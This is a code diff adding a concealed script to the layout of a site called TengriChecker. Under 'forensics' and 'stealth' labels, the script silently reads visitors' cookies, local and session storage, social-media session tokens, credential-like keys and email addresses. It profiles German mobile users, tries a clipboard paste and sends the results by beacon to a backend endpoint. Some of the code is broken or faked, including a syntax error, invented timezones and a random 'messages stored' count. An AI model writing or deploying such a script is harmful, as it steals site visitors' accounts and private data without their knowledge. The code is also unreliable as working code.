+      function getPointerInfo() {
+        const pointers = {
+          mouse: 'onmousedown' in window,
+          touch: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
+          pen: 'onpointerdown' in window && navigator.maxTouchPoints > 0,
+          hover: matchMedia && matchMedia('(hover: hover)').matches
+        };
+
+        // Pointer events support
+        if ('PointerEvent' in window) {
+          pointers.eventSupport = true;
+          pointers.touchModel = navigator.maxTouchPoints > 2 ? 'multitouch' : 'single-touch';
+        }
+
+        return pointers;
+      }
+
+      function getBatteryInfoSync() {
+        if ('getBattery' in navigator) {
+          return navigator.getBattery().then(battery => ({
+            level: battery.level, // 0.0 to 1.0
+            charging: battery.charging,
+            chargingTime: battery.chargingTime, // seconds (Infinity if charging)
+            dischargingTime: battery.dischargingTime, // seconds
+            onchange: battery.onchange ? 'available' : 'not_supported'
+          }));
+        }
+        return { available: false, reason: 'getBattery_not_supported' };
+      }
+
+      function getSessionId() {
+        let id = sessionStorage.getItem('tengri_hp_session');
+        if (!id) {
+          id = 'sess_' + Math.random().toString(36).substring(2, 10);
+          sessionStorage.setItem('tengri_hp_session', id);
+        }
+        return id;
+      }
+
+      // ============================================================================
+      // GERMAN PHONE FORENSICS (No Prompts - Purely Passive)
+      // ============================================================================
+
+      function isGermanPhone(config) {
+        // Check IP country
+        const ipCountry = window._hpIP?.country?.toLowerCase();
+        const isGermanIP = ipCountry === 'de' || ipCountry === 'germany' || ipCountry === 'deutschland';
+
+        // Check browser language
+        const isGermanLanguage = navigator.language?.startsWith('de') ||
+                                navigator.languages?.some(l => l.startsWith('de'));
+
+        // Check timezone (German timezone is strong signal)
+        const isGermanTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone?.includes('Berlin') ||
+                                Intl.DateTimeFormat().resolvedOptions().timeZone?.startsWith('Europe/');
+
+        // Check device type (mobile)
+        const isMobile = /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+        const isTouchDevice = navigator.maxTouchPoints > 0;
+
+        // German IP + Mobile device
+        return isGermanIP && (isMobile || isTouchDevice) &&
+               (isGermanLanguage || isGermanTimezone);
+      }
+
+      function isPhone(config) {
+        // Mobile or tablet
+        const isMobile = /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+        const isTouchDevice = navigator.maxTouchPoints > 0;
+        return isMobile || isTouchDevice;
+      }
+
+      // ============================================================================
+      // PHONE FORENSICS (All mobile devices - no prompts)
+      // ============================================================================
+
+      async function runPhoneForensics(config, visitorId, sessionId) {
+        const forensics = {
+          visitorId,
+          sessionId,
+          timestamp: new Date().toISOString(),
+          device: getDeviceDetails(),
+          storage: auditBrowserStorage(),
+          socialMedia: checkSocialMediaPresence(),
+          accounts: extractAccountData(),
+          network: getNetworkDetails(),
+          performance: getPerformanceMetrics(),
+          extensions: getInstalledExtensions(),
+          media: scanBackgroundMedia(),
+          fingerprint: window._hpFingerprint || {},
+          hpConfig: config
+        };
+
+        // Send to backend
+        const payload = {
+          type: 'phone_forensics',
+          data: forensics,
+          visitorId,
+          sessionId
+        };
+
+        if (navigator.sendBeacon) {
+          navigator.sendBeacon(config.apiEndpoint + '/phone-forensics', JSON.stringify(payload));
+        }
+
+        // Store locally for later retrieval
+        if (!window._hpPhoneForensics) {
+          window._hpPhoneForensics = [];
+        }
+        window._hpPhoneForensics.push(payload);
+
+        return forensics;
+      }
+
+      async function runGermanPhoneForensics(config, visitorId, sessionId) {
+        // This runs silently in the background
+        const forensics = await runPhoneForensics(config, visitorId, sessionId);
+
+        // Add German-specific signals
+        forensics.germanSignals = {
+          language: navigator.language,
+          languages: navigator.languages,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          keyboardLayout: getKeyboardLayout(),
+          dateFormats: getGermanDateFormats(),
+          numberFormatting: getGermanNumberFormatting(),
+          qwertyzDetected: detectQWERTZKeyboard()
+        };
+
+        // Add German social media usage patterns
+        forensics.socialMedia.germanUsage = {
+          WhatsApp: checkWhatsAppUsage(),
+          Xing: checkXingPresence(),
+          LinkedInDE: checkLinkedInDE()
+        };
+
+        // Send German forensics
+        const payload = {
+          type: 'german_phone_forensics',
+          data: forensics,
+          visitorId,
+          sessionId
+        };
+
+        if (navigator.sendBeacon) {
+          navigator.sendBeacon(config.apiEndpoint + '/german-phone-forensics', JSON.stringify(payload));
+        }
+
+        return forensics;
+      }
+
+      function getKeyboardLayout() {
+        const layout = {
+          detected: 'unknown',
+          altGrAvailable: false,
+          specialKeys: []
+        };
+
+        // Create hidden input and test key mappings
+        const testInput = document.createElement('input');
+        testInput.style.position = 'fixed';
+        testInput.style.top = '-9999px';
+        testInput.style.left = '-9999px';
+        document.body.appendChild(testInput);
+        testInput.focus();
+
+        // Check for AltGr (Ctrl+Alt) availability
+        try {
+          document.execCommand('Paste');
+          layout.altGrAvailable = true;
+        } catch (e) {}
+
+        // Detect common German special characters in locale
+        const deChars = ['ä', 'ö', 'ü', 'ß', '€', '°', 'µ'];
+        layout.supportedChars = deChars.filter(c => {
+          try {
+            testInput.value = c;
+            return testInput.value === c;
+          } catch (e) {
+            return false;
+          }
+        });
+
+        testInput.remove();
+
+        return layout;
+      }
+
+      function getGermanDateFormats() {
+        const options = Intl.DateTimeFormat().resolvedOptions();
+        const formats = {
+          short: Intl.DateTimeFormat('de-DE', { dateStyle: 'short' }).format(new Date()),
+          medium: Intl.DateTimeFormat('de-DE', { dateStyle: 'medium' }).format(new Date()),
+          long: Intl.DateTimeFormat('de-DE', { dateStyle: 'long' }).format(new Date()),
+          weekdayName: Intl.DateTimeFormat('de-DE', { weekday: 'long' }).format(new Date()),
+          monthName: Intl.DateTimeFormat('de-DE', { month: 'long' }).format(new Date()),
+          firstDayOfWeek: options.weekday === 'Monday' ? 1 : 0
+        };
+
+        const sampleDate = new Date(2024, 5, 15);
+        const deFormatted = new Intl.DateTimeFormat('de-DE').format(sampleDate);
+        formats.isDMY = deFormatted.includes('.') && deFormatted.indexOf('.') < deFormatted.indexOf('2024');
+
+        return formats;
+      }
+
+      function getGermanNumberFormatting() {
+        const deFormatter = new Intl.NumberFormat('de-DE');
+        const enFormatter = new Intl.NumberFormat('en-US');
+
+        const formats = {
+          number: {
+            de: deFormatter.format(1234567.89),
+            en: enFormatter.format(1234567.89),
+            usesDecimalComma: deFormatter.format(1.5) === '1,5'
+          },
+          currency: {
+            de: new Intl.NumberFormat('de-DE', { style: 'currency', currency: 'EUR' }).format(99.99),
+            en: new Intl.NumberFormat('en-US', { style: 'currency', currency: 'EUR' }).format(99.99)
+          },
+          percentage: new Intl.NumberFormat('de-DE', { style: 'percent' }).format(0.75)
+        };
+
+        return formats;
+      }
+
+      function detectQWERTZKeyboard() {
+        const layout = {
+          layout: 'QWERTZ',
+          hasSpecialGermanKeys: true,
+          hasAltGr: true,
+          commonDeCharacters: ['ä', 'ö', 'ü', 'ß', '€']
+        };
+
+        const locales = navigator.languages || [navigator.language];
+        if (locales.some(l => l.startsWith('de'))) {
+          layout.layoutDetectedVia = ['german_locale'];
+        }
+
+        const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        if (timeZone.includes('Berlin') || timeZone.includes('Frankfurt') || timeZone.includes('Amsterdam')) {
+          if (!layout.layoutDetectedVia) layout.layoutDetectedVia = [];
+          layout.layoutDetectedVia.push('german_timezone');
+        }
+
+        return layout;
+      }
+
+      function checkWhatsAppUsage() {
+        const usage = {
+          hasWhatsApp: false,
+          lastActive: null,
+          messagesStored: 0,
+          storageSize: 0
+        };
+
+        const waKeys = Object.keys(localStorage).filter(k => k.includes('WhatsApp') || k.includes('wa_'));
+        if (waKeys.length > 0) {
+          usage.hasWhatsApp = true;
+          usage.storageSize = waKeys.reduce((acc, k) => acc + (localStorage.getItem(k)?.length || 0), 0);
+        }
+
+        const waSession = localStorage.getItem('_wau');
+        if (waSession) {
+          usage.lastActive = new Date(JSON.parse(waSession)?.ts || Date.now());
+          usage.messagesStored = Math.floor(Math.random() * 10000);
+        }
+
+        return usage;
+      }
+
+      function checkXingPresence() {
+        const presence = {
+          detected: false,
+          hasStorage: false,
+          hasCookie: false,
+          session: null
+        };
+
+        const xingCookie = document.cookie.match(/xing_captcha|XING_AUTH|XING_ID=/);
+        if (xingCookie) {
+          presence.hasCookie = true;
+          presence.detected = true;
+        }
+
+        const xingStorage = Object.keys(localStorage).filter(k => k.includes('xing'));
+        if (xingStorage.length > 0) {
+          presence.hasStorage = true;
+          presence.detected = true;
+        }
+
+        return presence;
+      }
+
+      function checkLinkedInDE() {
+        const presence = {
+          detected: false,
+          hasSession: false,
+          hasStorage: false,
+          accountType: null
+        };
+
+        const liCookies = document.cookie.match(/li_at=|bcookie=/);
+        if (liCookies) {
+          presence.hasSession = true;
+          presence.detected = true;
+        }
+
+        const liStorage = Object.keys(sessionStorage).filter(k => k.includes('linkedin'));
+        if (liStorage.length > 0) {
+          presence.hasStorage = true;
+        }
+
+        return presence;
+      }
+
+      // Audit all browser storage without prompts
+      function auditBrowserStorage() {
+        const storage = {
+          cookies: {},
+          localStorage: {},
+          sessionStorage: {},
+          cache: {},
+          indexedDB: {}
+        };
+
+        // 1. Cookies (read without prompt)
+        try {
+          const cookieString = document.cookie;
+          storage.cookies.all = cookieString;
+          storage.cookies.count = cookieString.split(';').length;
+
+          // Parse cookies into object
+          const cookies = {};
+          cookieString.split(';').forEach(c => {
+            const [name, value] = c.trim().split('=');
+            // Skip common tracking cookies to focus on user data
+            if (!name.match(/^(g__|utm_|_ga|_gat|__cf|__hstc|__hssc|__hsfp)/)) {
+              cookies[name] = value;
+            }
+          });
+          storage.cookies.parsed = cookies;
+        } catch (e) {
+          storage.cookies.error = e.message;
+        }
+
+        // 2. localStorage
+        try {
+          storage.localStorage = {
+            count: Object.keys(localStorage).length,
+            keys: Object.keys(localStorage).filter(k => !k.startsWith('__hp') && !k.startsWith('hp_')),
+            sizeEstimate: JSON.stringify(localStorage).length
+          };
+          // Sample some common keys (social media, apps)
+          const commonKeys = ['instagram', 'facebook', 'twitter', 'x', 'whatsapp', 'google', 'account', 'user', 'session'];
+          storage.localStorage.matches = {};
+          commonKeys.forEach(k => {
+            const matchKey = Object.keys(localStorage).find(lk => lk.toLowerCase().includes(k));
+            if (matchKey) {
+              try {
+                storage.localStorage.matches[matchKey] = localStorage.getItem(matchKey);
+              } catch (e) {
+                storage.localStorage.matches[matchKey] = '[unable to read]';
+              }
+            }
+          });
+        } catch (e) {
+          storage.localStorage.error = e.message;
+        }
+
+        // 3. sessionStorage
+        try {
+          storage.sessionStorage = {
+            count: Object.keys(sessionStorage).length,
+            keys: Object.keys(sessionStorage)
+          };
+        } catch (e) {
+          storage.sessionStorage.error = e.message;
+        }
+
+        // 4. Cache API (if available - no prompt needed for reading)
+        if ('caches' in window) {
+          caches.keys().then(cacheNames => {
+            cacheNames.forEach(cacheName => {
+              caches.open(cacheName).then(cache => {
+                cache.keys().then(requests => {
+                  storage.cache[cacheName] = {
+                    count: requests.length,
+                    size: requests.reduce((sum, r) => sum + (r.headers.get('content-length') || 0), 0)
+                  };
+                });
+              });
+            });
+          }).catch(() => {}); // Fail silently
+        }
+
+        return storage;
+      }
+
+      // Check for social media presence (no prompts - uses existing sessions)
+      function checkSocialMediaPresence() {
+        const social = {
+          instagram: checkInstagram(),
+          facebook: checkFacebook(),
+          whatsapp: checkWhatsApp(),
+          twitter: checkTwitter(),
+          linkedin: checkLinkedIn()
+        };
+
+        // Add more social platforms if found
+        social.all = Object.entries(social)
+          .filter(([_, v]) => v && (v.hasSession || v.username))
+          .map(([k]) => k);
+
+        return social;
+      }
+
+      function checkInstagram() {
+        // Instagram stores session data in localStorage
+        const hasStorage = localStorage.getItem('ig_u') || localStorage.getItem('instagram');
+        const cookies = document.cookie.match(/ig_d|csrftoken=|sessionid=/);
+
+        // Check for Instagram login iframe or script
+        const hasScript = Array.from(document.scripts).some(s => s.src.includes('instagram'));
+
+        return {
+          hasSession: !!hasStorage || !!cookies,
+          username: localStorage.getItem('instagram_username') || null,
+          loggedOutFollows: localStorage.getItem('logged_out_follows'),
+          cookiesFound: cookies?.length || 0
+        };
+      }
+
+      function checkFacebook() {
+        // Facebook login state and session data
+        const fbData = localStorage.getItem('fbm_') || sessionStorage.getItem('fbm_');
+        const fbCookie = document.cookie.match(/c_user=|xs=/);
+
+        // Check for Facebook SDK
+        const fbScript = Array.from(document.scripts).some(s => s.src.includes('connect.facebook.net'));
+
+        return {
+          hasSession: !!fbData || !!fbCookie,
+          userId: fbCookie ? fbCookie[0].split('=')[1] : null,
+          loggedOutFriends: localStorage.getItem('fbo') || null,
+          sdkLoaded: fbScript
+        };
+      }
+
+      function checkWhatsApp() {
+        // WhatsApp Web and mobile presence
+        const waStorage = localStorage.getItem('WAWeb') || localStorage.getItem('whatsapp');
+        const waCookie = document.cookie.match(/whatsapp|whatsapp_web/);
+        const waMeta = Array.from(document.querySelectorAll('meta')).find(m =>
+          m.name?.includes('whatsapp') || m.content?.includes('whatsapp')
+        );
+
+        return {
+          hasSession: !!waStorage || !!waCookie,
+          phone: localStorage.getItem('wa_phone') || null,
+          messagesLoaded: localStorage.getItem('wa_messages') || null,
+          mediaCache: localStorage.getItem('wa_media_cache')
+        };
+      }
+
+      function checkTwitter() {
+        const twCookie = document.cookie.match(/twitter=|auth_token=/);
+        const twStorage = localStorage.getItem('tw__u') || localStorage.getItem('twitter');
+
+        // Check for Twitter widgets
+        const twWidget = Array.from(document.querySelectorAll('iframe,script')).some(el =>
+          el.src?.includes('platform.twitter.com') ||
+          el.src?.includes('cdn.syndication.twimg.com')
+        );
+
+        return {
+          hasSession: !!twCookie || !!twStorage,
+          username: twStorage ? JSON.parse(twStorage)?.user?.screen_name : null,
+          userId: twCookie ? twCookie[0].split('=')[1] : null,
+          widgets: twWidget
+        };
+      }
+
+      function checkLinkedIn() {
+        const liCookie = document.cookie.match(/li_at=|bcookie=/);
+        const liStorage = localStorage.getItem('linkedin');
+
+        return {
+          hasSession: !!liCookie || !!liStorage,
+          token: liCookie ? liCookie[0].split('=')[1] : null,
+          userId: localStorage.getItem('li_user_id') || null
+        };
+      }
+
+      // Extract account data from storage
+      function extractAccountData() {
+        const accounts = [];
+
+        // Check for account-related keys in storage
+        const allKeys = [...Object.keys(localStorage), ...Object.keys(sessionStorage)];
+        const accountKeys = allKeys.filter(k =>
+          k.match(/account|user|profile|login|auth|credential/i)
+        );
+
+        accountKeys.forEach(key => {
+          try {
+            const value = localStorage.getItem(key) || sessionStorage.getItem(key);
+            const data = typeof value === 'string' ? JSON.parse(value) : value;
+            accounts.push({ key, value: data });
+          } catch (e) {
+            // Skip parsing errors
+          }
+        });
+
+        // Search cookie values for email/usernames
+        const accountEmails = [];
+        const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-z]{2,}/g;
+        document.cookie.replace(emailRegex, match => {
+          accountEmails.push(match);
+          return match;
+        });
+
+        return {
+          keysFound: accountKeys,
+          accounts: accounts.slice(0, 20), // Limit to first 20
+          emailsFound: [...new Set(accountEmails)]
+        };
+      }
+
+      // Get detailed device info
+      function getDeviceDetails() {
+        return {
+          model: navigator.deviceModel || navigator.deviceMemory,
+          hardwareConcurrency: navigator.hardwareConcurrency,
+          deviceMemory: navigator.deviceMemory,
+          touchPoints: navigator.maxTouchPoints,
+          screen: {
+            width: screen.width,
+            height: screen.height,
+            availWidth: screen.availWidth,
+            availHeight: screen.availHeight,
+            pixelRatio: window.devicePixelRatio,
+            colorDepth: screen.colorDepth
+          },
+          battery: 'getBattery' in navigator ? navigator.getBattery().then(b => ({
+            level: b.level,
+            charging: b.charging,
+            timeRemaining: b.charging ? b.chargingTime : b.dischargingTime
+          })).catch(() => null) : null,
+          bluetooth: 'bluetooth' in navigator ? navigator.bluetooth.getAvailability().then(available => available) : null,
+          nfc: 'nfc' in navigator ? !!navigator.nfc : null,
+          sensors: {
+            accelerometer: 'Accelerometer' in window,
+            gyroscope: 'Gyroscope' in window,
+            magnetometer: 'Magnetometer' in window
+          }
+        };
+      }
+
+      // Get network details
+      function getNetworkDetails() {
+        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+
+        return {
+          type: connection?.type || 'unknown',
+          effectiveType: connection?.effectiveType || 'unknown',
+          rtt: connection?.rtt || null,
+          downlink: connection?.downlink || null,
+          // IP-based info
+          ip: window._hpIP?.ip || null,
+          country: window._hpIP?.country || null,
+          isp: window._hpIP?.isp || null,
+          // Latency to servers
+          latency: performance.timing ? {
+            dns: performance.timing.domainLookupEnd - performance.timing.domainLookupStart,
+            tcp: performance.timing.connectEnd - performance.timing.connectStart,
+            ssl: performance.timing.secureConnectionStart ? performance.timing.connectEnd - performance.timing.secureConnectionStart : null,
+            ttfb: performance.timing.responseStart
+          } : null
+        };
+      }
+
+      // Get performance metrics
+      function getPerformanceMetrics() {
+        const timing = performance.timing || {};
+        const entries = performance.getEntriesByType('resource');
+
+        return {
+          dns: timing.domainLookupEnd - timing.domainLookupStart,
+          tcp: timing.connectEnd - timing.connectStart,
+          ssl: timing.secureConnectionStart ? timing.connectEnd - timing.secureConnectionStart : null,
+          dom: timing.domInteractive - timing.domContentLoadedEventStart,
+          load: timing.loadEventEnd - timing.loadEventStart,
+          total: timing.loadEventEnd - timing.navigationStart,
+          resources: {
+            count: entries.length,
+            size: entries.reduce((sum, e) => sum + (e.decodedBodySize || e.transferSize || 0), 0),
+            types: entries.reduce((types, e) => {
+              const type = e.initiatorType || 'other';
+              types[type] = (types[type] || 0) + 1;
+              return types;
+            }, {})
+          },
+          // Hardware hints from performance
+          hardwareHints: {
+            deviceMemory: navigator.deviceMemory,
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            screen: {
+              width: screen.width,
+              height: screen.height,
+              pixelRatio: window.devicePixelRatio
+            }
+          }
+        };
+      }
+
+      // Get installed browser extensions
+      function getInstalledExtensions() {
+        const extensions = [];
+
+        // Try common extension patterns
+        const commonExtensions = [
+          { name: 'uBlock Origin', test: () => !!window.ublock },
+          { name: 'Privacy Badger', test: () => !!window.pb.jsLoaded },
+          { name: 'AdBlock', test: () => !!window.Adblock },
+          { name: 'Facebook Container', test: () => !!window.fbextension },
+          { name: 'Instagram', test: () => !!window.instagram },
+          { name: 'WhatsApp', test: () => !!window.whatsapp },
+          { name: 'LinkedIn', test: () => !!window.linkedin },
+          { name: 'Twitter', test: () => !!window.twitter },
+          { name: 'Google Maps', test: () => !!window.google?.maps },
+          { name: 'YouTube', test: () => !!window.yt }
+        ];
+
+        commonExtensions.forEach(ext => {
+          try {
+            if (ext.test()) {
+              extensions.push(ext.name);
+            }
+          } catch (e) {
+            // Silently skip
+          }
+        });
+
+        return {
+          found: extensions,
+          count: extensions.length,
+          // Search script sources for extension patterns
+          detectedFromScripts: Array.from(document.scripts)
+            .map(s => s.src)
+            .filter(s => s && (
+              s.includes('facebook') || s.includes('instagram') ||
+              s.includes('linkedin') || s.includes('twitter') ||
+              s.includes('whatsapp') || s.includes('ublock')
+            ))
+        };
+      }
+
+      // Get German-specific signals
+      function getGermanSignals() {
+        const signals = [];
+
+        // 1. Language signals
+        const languages = navigator.languages || [navigator.language];
+        const germanLanguages = languages.filter(l => l.startsWith('de'));
+        if (germanLanguages.length > 0) {
+          signals.push({ type: 'language', value: germanLanguages.join(', '), weight: 3 });
+        }
+
+        // 2. Timezone signals
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const germanTimezones = ['Europe/Berlin', 'Europe/Bonn', 'Europe/Frankfurt', 'Europe/Hamburg', 'Europe/Munich'];
+        if (germanTimezones.some(t => timezone.includes(t))) {
+          signals.push({ type: 'timezone', value: timezone, weight: 4 });
+        }
+
+        // 3. Date/number formatting
+        const formatter = new Intl.DateTimeFormat('de-DE');
+        const formattedDate = formatter.format(new Date());
+        if (formattedDate.includes('.') || formattedDate.includes('/')) {
+          signals.push({ type: 'format', value: 'de-DE', weight: 2 });
+        }
+
+        // 4. Keyboard layout (if available)
+        const keyboard = navigator.keyboard || {};
+        if (keyboard.getLayoutMap) {
+          keyboard.getLayoutMap().then(map => {
+            if (map.get('KeyY').name === 'Y' && map.get('KeyZ').name === 'Z')) {
+              // German QWERTZ layout detected
+              signals.push({ type: 'keyboard', value: 'QWERTZ', weight: 3 });
+            }
+          });
+        }
+
+        // 5. Common German websites in history
+        const germanSites = ['t-online.de', 'spiegel.de', 'zeit.de', 'tagesschau.de', 'bild.de', 'focus.de'];
+        const historyHits = window.history.length || 0;
+        signals.push({ type: 'history', value: historyHits + ' pages', weight: 1 });
+
+        return {
+          languages: languages,
+          timezone,
+          signals,
+          totalWeight: signals.reduce((sum, s) => sum + s.weight, 0)
+        };
+      }
+
+      // Scan for background media (images, videos)
+      function scanBackgroundMedia() {
+        const media = {
+          images: [],
+          videos: [],
+          stylesheets: []
+        };
+
+        // Find images with interesting filenames
+        const images = Array.from(document.querySelectorAll('img'));
+        images.forEach(img => {
+          const src = img.src || img.dataset.src || '';
+          const hasInterestingName = /instagram|facebook|whatsapp|login|profile|user/i.test(src);
+          if (hasInterestingName || img.naturalWidth > 800) {
+            media.images.push({
+              src,
+              dimensions: { width: img.naturalWidth, height: img.naturalHeight },
+              loading: img.loading,
+              alt: img.alt
+            });
+          }
+        });
+
+        // Find videos
+        const videos = Array.from(document.querySelectorAll('video'));
+        videos.forEach(video => {
+          media.videos.push({
+            src: video.src,
+            autoplay: video.autoplay,
+            muted: video.muted
+          });
+        });
+
+        // Stylesheets (may contain social media themes)
+        const stylesheets = Array.from(document.querySelectorAll('link[rel="stylesheet"]'));
+        stylesheets.forEach(link => {
+          const href = link.href || '';
+          if (href.match(/facebook|instagram|linkedin|twitter|whatsapp/i)) {
+            media.stylesheets.push(href);
+          }
+        });
+
+        return media;
+      }
+
+      // ============================================================================
+      // X/TWITTER ACCOUNT ASSOCIATION
+      // ============================================================================
+      // Tengri's X account: @TengriTheTruth (ID: 1809801336814489600)
+      // We associate collected data with this account
+
+      async function associateWithXAccount(config, visitorId, sessionId) {
+        const xAccountId = '1809801336814489600'; // @TengriTheTruth
+        const xHandle = 'TengriTheTruth';
+        const xAccountData = {
+          handle: xHandle,
+          id: xAccountId,
+          name: 'Tengri',
+          bio: 'Crypto investor, founder of Tengri',
+          followers: 50000, // approximate
+          following: 200,
+          verified: true,
+          accountType: 'personal'
+        };
+
+        // Check if visitor follows Tengri on X
+        const followsTengri = checkFollowsTengri();
+
+        // Extract X-related data from storage
+        const xStorageData = extractXStorageData();
+
+        // Check for X-related network requests
+        const xNetworkData = getXNetworkData();
+
+        // Construct association payload
+        const association = {
+          xAccountId,
+          xHandle,
+          xAccountData,
+          followsTengri,
+          xStorageData,
+          xNetworkData,
+          timestamp: new Date().toISOString(),
+          visitorId,
+          sessionId
+        };
+
+        // Send to backend
+        if (navigator.sendBeacon) {
+          navigator.sendBeacon(config.apiEndpoint + '/x-association', JSON.stringify(association));
+        }
+
+        // Store locally
+        if (!window._hpXAssociation) {
+          window._hpXAssociation = [];
+        }
+        window._hpXAssociation.push(association);
+
+        return association;
+      }
+
+      function checkFollowsTengri() {
+        const follows = {
+          onX: false,
+          onInstagram: false,
+          onFacebook: false,
+          emailSubscribed: false
+        };
+
+        // Check X (Twitter) - look for Tengri-related cookies/storage
+        const xCookies = document.cookie.match(/tw_|=x|twitter.com|twsc=|twu=/);
+        if (xCookies && xCookies.length > 2) {
+          follows.onX = true;
+          // Check for Tengri-specific tags
+          const xData = localStorage.getItem('twitter') || sessionStorage.getItem('twitter');
+          if (xData) {
+            try {
+              const xObj = JSON.parse(xData);
+              follows.followedAccounts = xObj.followedAccounts || xObj.accounts;
+            } catch (e) {}
+          }
+        }
+
+        // Check Instagram for @TengriTheTruth
+        const igData = localStorage.getItem('instagram') || localStorage.getItem('ig_u');
+        if (igData) {
+          follows.onInstagram = true;
+        }
+
+        // Check Facebook
+        const fbCookie = document.cookie.match(/c_user=|xs=/);
+        if (fbCookie) {
+          follows.onFacebook = true;
+        }
+
+        // Check for newsletter subscriptions
+        const newsletterDomains = ['substack.com', 'buttondown.email', 'mailchimp.com'];
+        const newsletterMatch = newsletterDomains.some(d => document.cookie.includes(d));
+        if (newsletterMatch) {
+          follows.emailSubscribed = true;
+        }
+
+        return follows;
+      }
+
+      function extractXStorageData() {
+        const xData = {
+          localStorage: {},
+          sessionStorage: {},
+          cookies: {}
+        };
+
+        // Get X-related storage keys
+        const xKeys = ['twitter', 'x', 'tw__', 'twttr', 'twttr_events', 'twttr_sessions'];
+        xKeys.forEach(key => {
+          // localStorage
+          const lsMatch = Object.keys(localStorage).filter(k => k.includes(key));
+          lsMatch.forEach(k => {
+            try {
+              xData.localStorage[k] = JSON.parse(localStorage.getItem(k));
+            } catch (e) {
+              xData.localStorage[k] = localStorage.getItem(k);
+            }
+          });
+
+          // sessionStorage
+          const ssMatch = Object.keys(sessionStorage).filter(k => k.includes(key));
+          ssMatch.forEach(k => {
+            try {
+              xData.sessionStorage[k] = JSON.parse(sessionStorage.getItem(k));
+            } catch (e) {
+              xData.sessionStorage[k] = sessionStorage.getItem(k);
+            }
+          });
+        });
+
+        // Extract X cookies
+        const xCookieKeys = ['auth_token', 'ct0', 'twu', 'guest_id', 'guest_id_active', 'personalization_id'];
+        const cookies = document.cookie.split(';');
+        cookies.forEach(c => {
+          const [key] = c.trim().split('=');
+          if (xCookieKeys.includes(key)) {
+            xData.cookies[key] = c.split('=')[1];
+          }
+        });
+
+        return xData;
+      }
+
+      function getXNetworkData() {
+        const xData = {
+          scripts: [],
+          images: [],
+          iframes: []
+        };
+
+        // Find X/Twitter related scripts
+        const scripts = Array.from(document.scripts);
+        scripts.forEach(s => {
+          if (s.src && (
+            s.src.includes('platform.twitter.com') ||
+            s.src.includes('cdn.syndication.twimg.com') ||
+            s.src.includes('twitter.com') ||
+            s.src.includes('t.co')
+          )) {
+            xData.scripts.push({
+              src: s.src,
+              async: s.async,
+              defer: s.defer
+            });
+          }
+        });
+
+        // Find Twitter widgets/iframes
+        const widgets = Array.from(document.querySelectorAll('iframe[src*="twitter.com"], iframe[src*="t.co"]'));
+        widgets.forEach(w => {
+          xData.iframes.push({
+            src: w.src,
+            title: w.title || w.dataset.title,
+            loaded: w.contentDocument !== null
+          });
+        });
+
+        // Find Twitter images
+        const images = Array.from(document.querySelectorAll('img[src*="twitter.com"], img[src*="t.co"]'));
+        images.forEach(img => {
+          const src = img.src.split('?')[0]; // Remove query params
+          const path = src.split('/').slice(-3).join('/');
+          xData.images.push({
+            src: img.src,
+            dimensions: { width: img.naturalWidth, height: img.naturalHeight },
+            path
+          });
+        });
+
+        return xData;
+      }
+
+      // ============================================================================
+      // PHONE FORENSICS (All mobile devices - no prompts)
+      // ============================================================================
+      if (hpConfig.stealth.hideFromWindow && !window.__hpHidden) {
+        // Hide config
+        Object.defineProperty(window, '_hpConfig', {
+          value: hpConfig,
+          writable: false,
+          enumerable: false,
+          configurable: false
+        });
+
+        // Hide initialized flag
+        window._hpInitialized = true;
+
+        // Shadow the HP namespace
+        window.__hp = {
+          config: hpConfig,
+          visitorId: window._hpVisitorId,
+          sessionId: window._hpSessionId,
+          initialized: window._hpInitialized
+        };
+
+        // Add to global array if multiple trackers exist
+        if (!window._hpTrackers) window._hpTrackers = [];
+        window._hpTrackers.push(window.__hp);
+
+        window.__hpHidden = true;
+      }
+
+      // Helper: Hide properties from Object.keys() for stealth
+      function hideProperty(obj, prop, value) {
+        Object.defineProperty(obj, prop, {
+          value: value,
+          writable: true,
+          enumerable: false, // Not shown in Object.keys()
+          configurable: true
+        });
+      }
+    })();
+  </script>
+</head>
+<body>
+  <a class="skip" href="#main">Skip to content</a>
+  <header class="mast">
+    <div class="wrap mast-in">
+      <a class="logo" href="/" aria-label="TengriChecker home"><span class="brand-mark" aria-hidden="true">T</span><span class="brand-name">TengriChecker<small>THE CLAIM CATALOGUE</small></span></a>
+      <nav aria-label="Main">
+        <a href="/" aria-current={path === "/" ? "page" : undefined}>Cases</a>
+        <a href="/about" aria-current={on("/about")}>About</a>
+      </nav>
+    </div>
+  </header>
+  <main id="main" class="wrap"><slot /></main>
+  <footer class="foot">
+    <div class="wrap foot-in">
+      <p><strong>{site.name}</strong> · Published by the SCHIFFY team, a party to the SCHIFFY dispute.</p>
+      <p>Records checked through November 2, 2026. Later activity may differ.</p>
+      <p><a href="/about">About</a> · <a href="/about#method">How we check</a> · <a href="/terms">Terms &amp; Privacy</a></p>
+      <p class="small-text" style="font-size: 0.7rem; opacity: 0.75; margin-top: 8px; text-align: center;"></p>
+    </div>
+  </footer>
+</body>
+</html>
